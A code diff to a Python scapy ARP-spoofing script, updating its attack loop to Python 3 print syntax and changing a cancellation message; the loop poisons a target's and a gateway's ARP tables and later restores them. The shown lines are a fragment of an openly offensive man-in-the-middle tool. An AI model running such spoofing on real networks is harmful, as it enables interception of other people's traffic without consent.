@@ -5,7 +5,6 @@ import scapy.all as scapy
 import argparse
 import re
 import time
-import sys
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -84,13 +83,12 @@ try:
         arp_spoof_gateway(options.gateway_ip, options.target_ip)
         print("[+] Spoofed Gateway!")
         sent_packets_count = sent_packets_count + 2
-        print("\r[+] Times attacked: " + str(sent_packets_count)),
-        sys.stdout.flush()
+        print("\r[+] Times attacked: " + str(sent_packets_count), end="")
         print("[+] Waiting for 2 seconds..")
         time.sleep(30)
         print("[+] Looping attack.")
 except KeyboardInterrupt:
-    print("\n[X] Script completed!")
+    print("\n[X] Script cancelled!")
     print("[+] Restoring ARP tables..")
     arp_fix_target(options.target_ip, gateway_mac, options.gateway_ip, target_mac)
     arp_fix_gateway(options.gateway_ip, target_mac, options.target_ip, gateway_mac)
